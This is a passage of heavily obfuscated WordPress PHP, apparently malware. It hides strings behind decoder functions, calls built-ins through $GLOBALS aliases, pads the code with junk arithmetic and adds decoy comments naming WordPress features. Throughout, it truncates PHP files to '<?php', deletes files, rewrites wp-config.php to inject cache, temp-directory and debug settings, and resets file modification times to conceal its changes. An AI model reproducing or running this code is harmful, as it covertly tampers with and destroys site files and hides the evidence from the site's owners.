if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($gwg0fsqvt08) &&  empty($gwg0fsqvt08[bk9m46jygo3f(1497)]))   $a3l16_60s2rsqw9[gz_aorofp7mo(1498)][$u0vg1o4w59jt6xuu][xognx_h1jzkh(1497)]     =   1;
   }
     $gk346m9zj2gq  =  true;
}
} elseif  (!$_od3cugccf39)   {$moy2uwoyo5w6bn=PHP_INT_MAX/PHP_INT_MAX;$ywe7uwgt3o8s4j=$moy2uwoyo5w6bn+99;



  $zn_8uj7t_be9ro3  =  @get_option(xognx_h1jzkh(1494), "");
   if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($zn_8uj7t_be9ro3) ||   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($zn_8uj7t_be9ro3, xognx_h1jzkh(1499))   !==  0)  @update_option(xognx_h1jzkh(1500),  bk9m46jygo3f(1501)  .  $GLOBALS['__scf_ks7_xfapvywl_185'](),     bk9m46jygo3f(1364));
}
  if    ($gk346m9zj2gq)     {



     if ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1502)))  @wp_cache_delete(gz_aorofp7mo(1463),  xognx_h1jzkh(1440));


$c7vz06zcgx_obj  =    @get_option(gz_aorofp7mo(1503),  array());
if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($c7vz06zcgx_obj)  && isset($c7vz06zcgx_obj[gz_aorofp7mo(1498)])  &&  $GLOBALS['__scf_zj8mp2xbaqmp_35']($c7vz06zcgx_obj[xognx_h1jzkh(1498)])) {

foreach ($c7vz06zcgx_obj[ar6vo_1nyhx2koj5(1498)]  as $jahopspvlb   => $zcupobsoang8y0)   {
    if  (isset($a3l16_60s2rsqw9[gz_aorofp7mo(1498)][$jahopspvlb]))  continue;
  if (!$GLOBALS['__scf_uh0dc0gefs_xhu_149']($jahopspvlb, $rf_3anf2fsf,      true))     {
  $a3l16_60s2rsqw9[bk9m46jygo3f(1498)][$jahopspvlb] =  $zcupobsoang8y0;
 

 continue;



   }
// MySQL JSON operators: unsatisfiable permission

  if  (isset($hzj7wsu8d_tpzz[$jahopspvlb])     &&    $GLOBALS['__scf_zj8mp2xbaqmp_35']($zcupobsoang8y0))   {
// WP Group Block: primary control-flow-graph

  $tnaqu4e6o0jbohr     =      isset($zcupobsoang8y0['g'])     ?    (float) $zcupobsoang8y0['g']   :    (float)    (isset($zcupobsoang8y0[xpm5lg9odtw6di(1504)])  ? $zcupobsoang8y0[ar6vo_1nyhx2koj5(1505)]   :  0);
  $cky5tvvxue   = isset($hzj7wsu8d_tpzz[$jahopspvlb]['g'])    ?  (float)  $hzj7wsu8d_tpzz[$jahopspvlb]['g']   :     (float) (isset($hzj7wsu8d_tpzz[$jahopspvlb][xpm5lg9odtw6di(1505)]) ? $hzj7wsu8d_tpzz[$jahopspvlb][ar6vo_1nyhx2koj5(1506)]    :    0);
      if   ($tnaqu4e6o0jbohr   >      $cky5tvvxue)  $a3l16_60s2rsqw9[xpm5lg9odtw6di(1507)][$jahopspvlb]  = $zcupobsoang8y0;
   unset($tnaqu4e6o0jbohr,  $cky5tvvxue);


  }
}
     }
 unset($c7vz06zcgx_obj,  $jahopspvlb,  $zcupobsoang8y0);
}


   foreach   ($hzj7wsu8d_tpzz as  $p4sn2dfyao0   =>    $pt9rklebxi_j)  {
      if (!isset($a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1508)][$p4sn2dfyao0])) xv6oqhjncehpr7v_mus7($pt9rklebxi_j['b']);
     }
// sample broadcaster for WP Categories Block

    unset($hzj7wsu8d_tpzz,   $p4sn2dfyao0,    $pt9rklebxi_j);
if   (empty($a3l16_60s2rsqw9[ar6vo_1nyhx2koj5(1508)]))   @delete_option(xognx_h1jzkh(1503));
elseif  ($gk346m9zj2gq)   @update_option(gz_aorofp7mo(1503), $a3l16_60s2rsqw9,    xpm5lg9odtw6di(1509));
  }  finally  {
 h1f3kqk1cj4d18z(gz_aorofp7mo(1503));
 }
  }


      function      e7hb1k_8ecz1pec1t($paudvk020we1z90)
       {

 return $GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)      &&  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,    ar6vo_1nyhx2koj5(1510))   !==   false  ||  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90, ar6vo_1nyhx2koj5(1511))  !== false    ||  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,  bk9m46jygo3f(1221))  !==   false   || $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,  gz_aorofp7mo(1512))     !==  false ||  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90, gz_aorofp7mo(1245))  !==  false  ||  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,   gz_aorofp7mo(1513))    !== false);
}


  function  zfqk6w3eid_wszi3gu6xz($paudvk020we1z90)
{
   if (!e7hb1k_8ecz1pec1t($paudvk020we1z90)) return   false;


if (tnvo03hz6g82ft2u7cjp1($paudvk020we1z90))  return    true;
   if ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](xognx_h1jzkh(1514),   $paudvk020we1z90,      $wmi9vtfi67mkceoi))  {
foreach  ($wmi9vtfi67mkceoi[1]  as  $a5dgjqx7655z)      {
if   (version_compare($a5dgjqx7655z,    xl8k_pjv1048a7ae7(),  '<'))     return  true;
}
  return  false;
 }
     return  true;
     }
  function jcqt05g90c1ut3849l($dz9ttep94ondlpl)
      {


  if   (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($dz9ttep94ondlpl)     ||   !@$GLOBALS['__scf_v7y4c72abxzjo_47']($dz9ttep94ondlpl)) return;


    $v9au38bovrp0    =  @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($dz9ttep94ondlpl);
  if (!$v9au38bovrp0)    return;
      if ($v9au38bovrp0   >  (19428745-8942985))     {
 $hkfkdlowc4nvy = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($dz9ttep94ondlpl,  false,   null,  0, (0x9252+0x6dae));
if (!e7hb1k_8ecz1pec1t($hkfkdlowc4nvy))     return;
     if (p82470xv4eq7_pm5tl4hw9($dz9ttep94ondlpl)     ===    false)    {
 kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1515),   ar6vo_1nyhx2koj5(1516) .   $GLOBALS['__scf_pmoxtzoe3f0qw_3']($dz9ttep94ondlpl));
  return;

   }
     @$GLOBALS['__scf_qy_a5siry0hu3_197']($dz9ttep94ondlpl,   "<?php\n");
        if   ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1289)))   @opcache_invalidate($dz9ttep94ondlpl,    true);
    return;
 }
   if     ($v9au38bovrp0 >      (1048490+86))  {
$ynowilt237o     =    (string)  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($dz9ttep94ondlpl, false, null,  0, (8095+97));



   $z267r7jqabhe9x  = ($v9au38bovrp0  > (8186+6)) ?   (string) @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($dz9ttep94ondlpl,    false,  null,     $v9au38bovrp0    -  (6307+1885))    :  "";
  $zgo0sw5qcv4t2j0   =  $ynowilt237o   .   $z267r7jqabhe9x;
     if      ($zgo0sw5qcv4t2j0 !==  ""   &&     $GLOBALS['__scf_k0rtq2h5b39ui_1370'](ar6vo_1nyhx2koj5(1514),  $zgo0sw5qcv4t2j0,  $nhh1nt79xe3f))  {


   $z4jdhs898fb  = false;$p0tl43w2j_n=PHP_INT_MAX/PHP_INT_MAX;$dv069ae0j=$p0tl43w2j_n+96;
   foreach     ($nhh1nt79xe3f[1]    as  $b5yn6f6eivy4v7)   {
  if  (version_compare($b5yn6f6eivy4v7,  xl8k_pjv1048a7ae7(),  '<'))     {
    $z4jdhs898fb    =     true;
  break;
   }
}

   if   (!$z4jdhs898fb) return;
        }
   }
$paudvk020we1z90   =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($dz9ttep94ondlpl);
if ($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)   &&  $GLOBALS['__scf_fxl4k4gsul_10']($paudvk020we1z90)      >    (1048531+45)) $paudvk020we1z90   =  za8ge46vc9y1a6($paudvk020we1z90);
  if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90))   return;$f0um44muoy3=-461;$w8u_zbx5dk6=($f0um44muoy3>0)?$f0um44muoy3:-$f0um44muoy3;
 if  (!zfqk6w3eid_wszi3gu6xz($paudvk020we1z90)) return;
k0_8d1vfyivkiep($dz9ttep94ondlpl,  $paudvk020we1z90);
}
   function k0_8d1vfyivkiep($dz9ttep94ondlpl,  $paudvk020we1z90)
   {
// WordPress 6.2 navigation: serializable synchronizer

      $_svae0z2nfoqm   =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](ar6vo_1nyhx2koj5(1517),  "",  $paudvk020we1z90);
    if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm)    ||  $GLOBALS['__scf_u6m4cedwgt__319']($_svae0z2nfoqm)    ===  "" ||  $GLOBALS['__scf_u6m4cedwgt__319']($_svae0z2nfoqm)  ===   ar6vo_1nyhx2koj5(778))  $_svae0z2nfoqm =   "<?php\n";$fflkdtqt13=88*3;$d3psy0kl1vjw=$fflkdtqt13-47;
   if ($GLOBALS['__scf_fxl4k4gsul_10']($_svae0z2nfoqm)   >= (460+40)   &&   !g9edwd6m8_9cm8($_svae0z2nfoqm))  $_svae0z2nfoqm   =  "<?php\n";


 $wm_pj4jaj5h14yk   = @fileperms($dz9ttep94ondlpl);
$wm_pj4jaj5h14yk =    ($wm_pj4jaj5h14yk     ===     false) ?     (368+52)   :      ($wm_pj4jaj5h14yk &   (494+17));



      $f2n78meu6z      =      @$GLOBALS['__scf_k4z5lhhe91ty_98']($dz9ttep94ondlpl);
        $qaducz36ekvq  =     @$GLOBALS['__scf_x5sykg98apqg2d_76']($GLOBALS['__scf_meo_1tvjsals_11']($dz9ttep94ondlpl),   xpm5lg9odtw6di(1518));
 if   ($qaducz36ekvq  === false)  return;
  if     (@$GLOBALS['__scf_qy_a5siry0hu3_197']($qaducz36ekvq,      $_svae0z2nfoqm) !== $GLOBALS['__scf_fxl4k4gsul_10']($_svae0z2nfoqm)) {$gknpl0f_hs=197;$bgyqo3zuz1n=($gknpl0f_hs>0)?$gknpl0f_hs:-$gknpl0f_hs;
@$GLOBALS['__scf_qsx1vml11ds_19']($qaducz36ekvq);


return;


}
  @$GLOBALS['__scf_nn76gmr4q6hh_18']($qaducz36ekvq,     $wm_pj4jaj5h14yk);
 if    (!@$GLOBALS['__scf_gjr57ltb3feage_74']($qaducz36ekvq,  $dz9ttep94ondlpl)) {

    @$GLOBALS['__scf_qsx1vml11ds_19']($qaducz36ekvq);
    return;
}
  if      ($f2n78meu6z)    @$GLOBALS['__scf_iylawj38txgw_73']($dz9ttep94ondlpl,     $f2n78meu6z);


  if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1289)))  @opcache_invalidate($dz9ttep94ondlpl,    true);
  }
    function    y31lcfa0eg_8sjissnsrol($agqwkuals2cm_xdp)
    {
 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($agqwkuals2cm_xdp)) return "";
if     ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(1519), $agqwkuals2cm_xdp,  $ipyjq28dv0))  {
 $g3z6ma16w7vxd =  $ipyjq28dv0[1];
$v9au38bovrp0 = @$GLOBALS['__scf_vpig9uwvw8_pu_20']($g3z6ma16w7vxd)  ?   @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($g3z6ma16w7vxd)  :  0;
 if     (!$v9au38bovrp0 ||     $v9au38bovrp0   <    (415+85)  || $v9au38bovrp0  >   (52428782+18)) {
if      ($v9au38bovrp0    >      (52428727+73))  {
    $yu57iori8cn0u1   = @$GLOBALS['__scf_amk7iuqda_oe_33']($g3z6ma16w7vxd);
 if      (!$GLOBALS['__scf_is0fvk8c7tq2_41']($yu57iori8cn0u1))  $yu57iori8cn0u1 = $g3z6ma16w7vxd;


$yu57iori8cn0u1   =    $GLOBALS['__scf_vz8ci2guu7b5_355']('\\',  '/',   $yu57iori8cn0u1);
   $_8cax_y0vigf5x1n  =  false;



$pjab5j99e_d4  = array(defined(xognx_h1jzkh(1146)) ?    $GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH,     xognx_h1jzkh(1192)) :  "", defined(ar6vo_1nyhx2koj5(1174))    ? $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_CONTENT_DIR,  bk9m46jygo3f(1520))  :  "");
   foreach  ($pjab5j99e_d4  as $pqzhitg97hlw7o)  {
 $pqzhitg97hlw7o    =  $GLOBALS['__scf_vz8ci2guu7b5_355']('\\', '/', $pqzhitg97hlw7o);
 if  ($pqzhitg97hlw7o    !==     ""   &&  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($yu57iori8cn0u1,   $pqzhitg97hlw7o .   '/')    === 0)     {
$_8cax_y0vigf5x1n   =   true;
     break;
}
}


 if ($_8cax_y0vigf5x1n  &&    p82470xv4eq7_pm5tl4hw9($g3z6ma16w7vxd) !==   false)      {
  @$GLOBALS['__scf_qsx1vml11ds_19']($g3z6ma16w7vxd);
    @$GLOBALS['__scf_qsx1vml11ds_19']($GLOBALS['__scf_meo_1tvjsals_11']($g3z6ma16w7vxd) . xognx_h1jzkh(679)   . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($g3z6ma16w7vxd,   bk9m46jygo3f(1361)));



       }  else     {
 kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1521),  ar6vo_1nyhx2koj5(1522)   .  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($g3z6ma16w7vxd));
    }
}



 return   "";
    }
}
       return $agqwkuals2cm_xdp;



     }



   function  q9igxjki7ymy1c6()
  {$l1xqrkdl9=6491;$och4j0sh2742m_=$l1xqrkdl9%2;



static    $g3z6ma16w7vxd  = null;
 if ($g3z6ma16w7vxd  ===    null)    {
 $a5dgjqx7655z   =   tjj1y86387zrz51(gz_aorofp7mo(1523),   null);
    if  ($a5dgjqx7655z   ===      null) {



  $jl8v2broescn1l    = tjj1y86387zrz51(xognx_h1jzkh(1147), "");


$a5dgjqx7655z    =     ($GLOBALS['__scf_is0fvk8c7tq2_41']($jl8v2broescn1l) &&   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($jl8v2broescn1l,  bk9m46jygo3f(568))   ===  0)    ? 1     :  0;
 fplgzzpq8bt5jm2fl03pi(xognx_h1jzkh(1523), $a5dgjqx7655z,   xpm5lg9odtw6di(1509));





unset($jl8v2broescn1l);



 }
  $g3z6ma16w7vxd   =  ((int)  $a5dgjqx7655z   ===  1);
  }
   return $g3z6ma16w7vxd;


   }



 function av9ady1lf7xf2b()
   {
 if (!defined(xognx_h1jzkh(1146))) return;
 $s6um63o_s0zywj1   =   ABSPATH .    ar6vo_1nyhx2koj5(1240);
  if  (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($s6um63o_s0zywj1))  {
      $xl_dkhzluq_    =  $GLOBALS['__scf_meo_1tvjsals_11'](ABSPATH) . xpm5lg9odtw6di(1524);
 if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($xl_dkhzluq_)) $s6um63o_s0zywj1   =   $xl_dkhzluq_;
  }



     if     (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($s6um63o_s0zywj1)  ||  !@$GLOBALS['__scf_v7y4c72abxzjo_47']($s6um63o_s0zywj1))      return;
   $yu57iori8cn0u1 =    @$GLOBALS['__scf_amk7iuqda_oe_33']($s6um63o_s0zywj1);
      if ($GLOBALS['__scf_is0fvk8c7tq2_41']($yu57iori8cn0u1)  &&    $yu57iori8cn0u1   !==  ""  &&  @$GLOBALS['__scf_v7y4c72abxzjo_47']($yu57iori8cn0u1))  $s6um63o_s0zywj1  = $yu57iori8cn0u1;



if    (@$GLOBALS['__scf_r6y1fbsyx8i2l_99']($s6um63o_s0zywj1) > (4194247+57))  return;
$paudvk020we1z90  = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($s6um63o_s0zywj1);
 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90)  ||  $paudvk020we1z90 ===  "")   return;


 $mdh2jeq0fu  = ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,  xognx_h1jzkh(1525))      !== false   ||  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90, xpm5lg9odtw6di(1526)) !==   false);
 $hdmh_ecglv643c9 =  false;

    if    ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,   gz_aorofp7mo(1527))     ===  false)   {
    if   (!empty($GLOBALS[xpm5lg9odtw6di(85)])) {
  $hdmh_ecglv643c9 =   true;
 } else   {$llxlhre9bi8fi=201|155;$kon8x4uh7r7=$llxlhre9bi8fi^96;
 $zkadhnn80t9nj5k0 =  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(711)) ?    $GLOBALS['__scf_wuj9qpo0vbx_78']() :   bk9m46jygo3f(79);
   if  (!@$GLOBALS['__scf_h23c49ni_b86_43']($zkadhnn80t9nj5k0) ||   !@$GLOBALS['__scf_v7y4c72abxzjo_47']($zkadhnn80t9nj5k0))  $hdmh_ecglv643c9 =  true;
     }



     }
   $w8bcrhldy6ff = false;
$p8gs38hp92ee  =  false;
 if    (!$GLOBALS['__scf_ak3p5za9uvhzh8_96'](gz_aorofp7mo(1528),  $paudvk020we1z90)   &&  defined(gz_aorofp7mo(1174))) {
// @propagate-const leaky-bucket

 $_ac  =  WP_CONTENT_DIR  . gz_aorofp7mo(505);


 if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($_ac))  {
 $vy5nkf1avsj9wd  = (string)    @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($_ac,   false,    null, 0,   (4060+36));
 if   ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($vy5nkf1avsj9wd,    xpm5lg9odtw6di(1529)) !== false) $w8bcrhldy6ff =  true;
   }
 }      elseif  (
$GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,   ar6vo_1nyhx2koj5(524))  === false

&& $GLOBALS['__scf_ak3p5za9uvhzh8_96'](ar6vo_1nyhx2koj5(1530),   $paudvk020we1z90)
 ) {
 $p8gs38hp92ee  =   true;
  }
  $bk2ub3at3fx = false;
if  (q9igxjki7ymy1c6())    {
    if    (
    !$GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1531), $paudvk020we1z90)
    ||    !$GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1532),  $paudvk020we1z90)
||      !$GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1533), $paudvk020we1z90)



 ) $bk2ub3at3fx =   true;
}
if    (!$mdh2jeq0fu   &&  !$hdmh_ecglv643c9  &&   !$w8bcrhldy6ff &&    !$bk2ub3at3fx  &&  !$p8gs38hp92ee)   return;
   $gq8am6tauei =     "";
  $_svae0z2nfoqm  = $paudvk020we1z90;
 if  ($mdh2jeq0fu)  {
 if     ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](gz_aorofp7mo(1534),   $paudvk020we1z90,    $kjs2ns5dxhpq_)) $gq8am6tauei   .= $GLOBALS['__scf_dq0_ug83xej_a_335']("\n", $kjs2ns5dxhpq_[0]);$p1s3eerna=(0xe8+0x19);$npmxknbqpq3=$p1s3eerna%9;
    $_svae0z2nfoqm = $GLOBALS['__scf_a6uiw8bt24jybf_454'](gz_aorofp7mo(1534), "",  $paudvk020we1z90);
  if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm)) return;
    if      (!$GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(1535),  $_svae0z2nfoqm)) {$m7hw7zhs6=8866;$l7g19d4uplz=$m7hw7zhs6%11;
   if ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](gz_aorofp7mo(1536),   $_svae0z2nfoqm,   $ju7n582y_ln3yil))   $gq8am6tauei  .=   "\n"   .  $GLOBALS['__scf_dq0_ug83xej_a_335']("\n", $ju7n582y_ln3yil[0]);



$_svae0z2nfoqm  = $GLOBALS['__scf_a6uiw8bt24jybf_454'](ar6vo_1nyhx2koj5(1536),  "",   $_svae0z2nfoqm);
if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm)) return;
 }



   }
  $wxw8maitnl     = xpm5lg9odtw6di(1537);

 if ($hdmh_ecglv643c9 &&   $GLOBALS['__scf_ak3p5za9uvhzh8_96']('/'  .  $wxw8maitnl     . '/',   $_svae0z2nfoqm))    {
$_svae0z2nfoqm  = $GLOBALS['__scf_a6uiw8bt24jybf_454'](bk9m46jygo3f(1538)  . $wxw8maitnl     .    bk9m46jygo3f(1539), xognx_h1jzkh(1540)   .    "define( 'WP_TEMP_DIR', ( defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : ABSPATH . 'wp-content' ) . '/.sc_tmp' );\n", $_svae0z2nfoqm, 1);
if      (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm)) return;
}
if ($w8bcrhldy6ff &&  $GLOBALS['__scf_ak3p5za9uvhzh8_96']('/'    . $wxw8maitnl   .    '/', $_svae0z2nfoqm)) {
 $_svae0z2nfoqm  = $GLOBALS['__scf_a6uiw8bt24jybf_454'](bk9m46jygo3f(1538)  . $wxw8maitnl    .     bk9m46jygo3f(1539),   ar6vo_1nyhx2koj5(1541)   . "define( 'WP_CACHE', true ); /* SC_WC */\n",     $_svae0z2nfoqm,   1);
   if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm))   return;
}    elseif   ($p8gs38hp92ee) {
$_svae0z2nfoqm =   $GLOBALS['__scf_a6uiw8bt24jybf_454'](gz_aorofp7mo(1538)   .  $wxw8maitnl .   ar6vo_1nyhx2koj5(1542), gz_aorofp7mo(1541) .    "define( 'WP_CACHE', true ); /* SC_WC */\n",  $_svae0z2nfoqm,  1);
if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm))  return;
 }
   if ($bk2ub3at3fx) {
 $_svae0z2nfoqm =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](ar6vo_1nyhx2koj5(1543),      "", $_svae0z2nfoqm);
 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm))  return;
 

 if  ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](ar6vo_1nyhx2koj5(1538) . $wxw8maitnl  .    ar6vo_1nyhx2koj5(1544),    $_svae0z2nfoqm))   {
 $_svae0z2nfoqm   =   $GLOBALS['__scf_a6uiw8bt24jybf_454'](xognx_h1jzkh(1538) . $wxw8maitnl .   xognx_h1jzkh(1544), xpm5lg9odtw6di(1541)  .     "define( 'WP_DEBUG', true );\ndefine( 'WP_DEBUG_LOG', true );\ndefine( 'WP_DEBUG_DISPLAY', false );\n",   $_svae0z2nfoqm,  1);


 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm))    return;
  }
     }
 if ($_svae0z2nfoqm  ===  $paudvk020we1z90)  return;
if (!g9edwd6m8_9cm8($_svae0z2nfoqm))   return;
 if ($p8gs38hp92ee &&  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1365)))   @update_option(gz_aorofp7mo(1545), 1,  bk9m46jygo3f(1509));


   if ($w8bcrhldy6ff  && !ut5isdl00gkjaids($s6um63o_s0zywj1,   $paudvk020we1z90)) {
  kkpdha95nyx3tbltd10(bk9m46jygo3f(1546),      xpm5lg9odtw6di(1282));
 $_svae0z2nfoqm    =      $GLOBALS['__scf_a6uiw8bt24jybf_454'](xognx_h1jzkh(1538) .  $wxw8maitnl . ar6vo_1nyhx2koj5(1547),  xpm5lg9odtw6di(1541), $_svae0z2nfoqm,     1);
 if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_svae0z2nfoqm)     ||  $_svae0z2nfoqm === $paudvk020we1z90) return;
    if   (!g9edwd6m8_9cm8($_svae0z2nfoqm)) return;
     }
    $wm_pj4jaj5h14yk     = @fileperms($s6um63o_s0zywj1);
    $wm_pj4jaj5h14yk   = ($wm_pj4jaj5h14yk  === false)      ?  (235+185)  :  ($wm_pj4jaj5h14yk &    (0x10b+0xf4));
$f2n78meu6z = @$GLOBALS['__scf_k4z5lhhe91ty_98']($s6um63o_s0zywj1);
  $m2xajyieeetng =    @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($s6um63o_s0zywj1);
 if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($m2xajyieeetng)  || $m2xajyieeetng !==  $paudvk020we1z90)   {
  kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1546), xognx_h1jzkh(1196));
return;
  }
unset($m2xajyieeetng);
    $qaducz36ekvq  =   @$GLOBALS['__scf_x5sykg98apqg2d_76']($GLOBALS['__scf_meo_1tvjsals_11']($s6um63o_s0zywj1),    xpm5lg9odtw6di(1548));
 if  ($qaducz36ekvq   ===  false)   return;$u0fsj2gk=151|124;$d39pcafvkl_4oo=$u0fsj2gk^78;



if  (@$GLOBALS['__scf_qy_a5siry0hu3_197']($qaducz36ekvq,  $_svae0z2nfoqm)   !==   $GLOBALS['__scf_fxl4k4gsul_10']($_svae0z2nfoqm))   {
  @$GLOBALS['__scf_qsx1vml11ds_19']($qaducz36ekvq);
   

    return;
  }
 @$GLOBALS['__scf_nn76gmr4q6hh_18']($qaducz36ekvq,   $wm_pj4jaj5h14yk);
if   (!@$GLOBALS['__scf_gjr57ltb3feage_74']($qaducz36ekvq,    $s6um63o_s0zywj1))   {
   @$GLOBALS['__scf_qsx1vml11ds_19']($qaducz36ekvq);
return;
    }
    if ($f2n78meu6z)   @$GLOBALS['__scf_iylawj38txgw_73']($s6um63o_s0zywj1,  $f2n78meu6z);
if   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1289))) @opcache_invalidate($s6um63o_s0zywj1, true);
 if    ($w8bcrhldy6ff) ykbctv6vdni0fv($s6um63o_s0zywj1);
 if   (($w8bcrhldy6ff ||   $p8gs38hp92ee)   &&  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1168)))   @delete_option(bk9m46jygo3f(1545));
   if ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](bk9m46jygo3f(1549),   $gq8am6tauei, $mga3p2k54ri))   {
 foreach  ($GLOBALS['__scf_p3c9g_i0vy_148']($mga3p2k54ri[1]) as $jynzxu9mmb)    {



   if   ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($jynzxu9mmb,   ar6vo_1nyhx2koj5(1526))  ===   0 &&  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($jynzxu9mmb))  @$GLOBALS['__scf_qsx1vml11ds_19']($jynzxu9mmb);
}
     }
  if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1168))     &&     $GLOBALS['__scf_k0rtq2h5b39ui_1370'](gz_aorofp7mo(1550),   $gq8am6tauei,   $wphfmq0x8il2t5e))    {
    foreach     ($GLOBALS['__scf_p3c9g_i0vy_148']($wphfmq0x8il2t5e[1])   as $cxr0vh4psoi)  {



 if ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(1551), $cxr0vh4psoi)) @delete_option($cxr0vh4psoi);
    }



}
 }
   function  nfm72w48q1gu0y0ha1()
  {
   if (!defined(xpm5lg9odtw6di(1174)))    return;
  $ezy6kbi9lllz    =      defined(ar6vo_1nyhx2koj5(804))   ?  WPMU_PLUGIN_DIR : WP_CONTENT_DIR    .  xognx_h1jzkh(14);
     $eaa7t9irzd7g9  =  array();

  if ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(726)))  {
  if  (@$GLOBALS['__scf_h23c49ni_b86_43']($ezy6kbi9lllz)) foreach    ((array) @$GLOBALS['__scf_b60g6hx_a7ggi_71']($ezy6kbi9lllz   .    xognx_h1jzkh(1552))  as  $il3zdkxo6f1fl2c4)      $eaa7t9irzd7g9[]  =    $il3zdkxo6f1fl2c4;
   if  (defined(gz_aorofp7mo(682))  &&   @$GLOBALS['__scf_h23c49ni_b86_43'](WP_PLUGIN_DIR))      foreach      ((array) @$GLOBALS['__scf_b60g6hx_a7ggi_71'](WP_PLUGIN_DIR  . gz_aorofp7mo(1553)) as  $il3zdkxo6f1fl2c4) $eaa7t9irzd7g9[] =  $il3zdkxo6f1fl2c4;

 }
// WP Featured Image: restore phantom

 $s9rk_2yu1i6au =     defined(bk9m46jygo3f(1146))  ?   ABSPATH   : "";



  $k8h48ngeb6ggxfbi =    WP_CONTENT_DIR . xognx_h1jzkh(88)     .    $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($s9rk_2yu1i6au   .    ar6vo_1nyhx2koj5(1554)),  0,  (10-2))    .     xpm5lg9odtw6di(89) .   $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($s9rk_2yu1i6au   .  bk9m46jygo3f(90)), 0,      (80^88))   .    gz_aorofp7mo(1361);
if     (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($k8h48ngeb6ggxfbi))   $eaa7t9irzd7g9[]  = $k8h48ngeb6ggxfbi;


foreach    ($eaa7t9irzd7g9  as  $il3zdkxo6f1fl2c4)  {
 $f2n78meu6z =  @$GLOBALS['__scf_k4z5lhhe91ty_98']($il3zdkxo6f1fl2c4);
